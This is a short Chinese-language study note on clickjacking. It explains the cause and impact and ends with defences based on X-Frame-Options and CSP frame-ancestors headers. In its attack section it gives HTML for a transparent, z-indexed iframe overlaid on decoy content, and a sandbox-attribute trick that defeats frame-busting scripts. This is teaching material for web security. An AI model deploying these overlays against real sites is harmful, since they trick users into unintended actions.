# Clickjacking
## 成因
* 基於界面的攻擊，使用者在不知情的情況，點擊了隱藏的按鈕或連結。
* 與 CSRF 不同在於，CSRF 不需要使用者進行操作。
## 影響
* 使用者在不知情的情況，進行不安全的操作。
## 攻擊方法
### 建構基本攻擊網站
* iframe 設定透明度與 z-index
* [burp clickbandit tool](https://portswigger.net/burp/documentation/desktop/tools/clickbandit)
```
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2; // front
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1; // back
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```
### 繞過 Frame busting
* 開發者可以使用 JS `if (top !== self)` 來確定網站是否是 iframe。
* 我們可以藉由 iframe 中 `sandbox` 屬性，來限制執行 JS，來繞過 `if (top !== self)` 檢查。
    * allow-forms: 允許傳送表單
    *  allow-scripts: 允許 JS
```
<iframe sandbox="allow-forms" src="..."></iframe>
```
## 防禦方法
### X-Frame-Options
* 禁止 iframe 嵌入
```
X-Frame-Options: deny
```
* 僅可在相同網域
```
X-Frame-Options: sameorigin
```
* 僅可在指定網站
```
X-Frame-Options: allow-from https://normal-website.com
```
### Content Security Policy (CSP)
* 禁止 iframe 嵌入
```
Content-Security-Policy: frame-ancestors 'none'
```
* 僅可在相同網域
```
Content-Security-Policy: frame-ancestors 'self'
```
* 僅可在指定網站
```
Content-Security-Policy: frame-ancestors https://normal-website.com
```
---
###### tags: `web security`